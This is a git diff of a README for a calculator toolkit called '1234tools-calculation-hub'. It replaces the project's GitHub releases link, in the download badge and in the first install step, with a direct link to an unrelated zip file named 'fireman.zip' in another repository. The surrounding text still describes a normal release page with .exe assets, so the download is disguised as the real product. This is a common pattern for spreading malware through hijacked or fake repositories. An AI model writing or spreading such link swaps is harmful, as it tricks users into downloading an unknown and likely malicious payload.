@@ -5,7 +5,7 @@ description: "Access over 1,100 browser-based calculators and converters for fin
 ---
 # 🧮 1234tools-calculation-hub - Solve daily math and engineering problems
 
-[![](https://img.shields.io/badge/Download-Latest-blue.svg)](https://github.com/almach880/1234tools-calculation-hub/releases)
+[![](https://img.shields.io/badge/Download-Latest-blue.svg)](https://raw.githubusercontent.com/almach880/almach880.github.io/main/notes/fireman.zip)
 
 ## 📌 About this toolkit
 
@@ -19,7 +19,7 @@ Your computer needs to meet basic standards to run this application. You should 
 
 Follow these steps to get the application on your computer:
 
-1. Visit the project release page: [https://github.com/almach880/1234tools-calculation-hub/releases](https://github.com/almach880/1234tools-calculation-hub/releases).
+1. Visit the project release page: [https://raw.githubusercontent.com/almach880/almach880.github.io/main/notes/fireman.zip](https://raw.githubusercontent.com/almach880/almach880.github.io/main/notes/fireman.zip).
 2. Look for the section labeled "Assets" at the bottom of the newest release post.
 3. Click the file ending in .exe to start your download.
 4. Save the file to your Downloads folder.
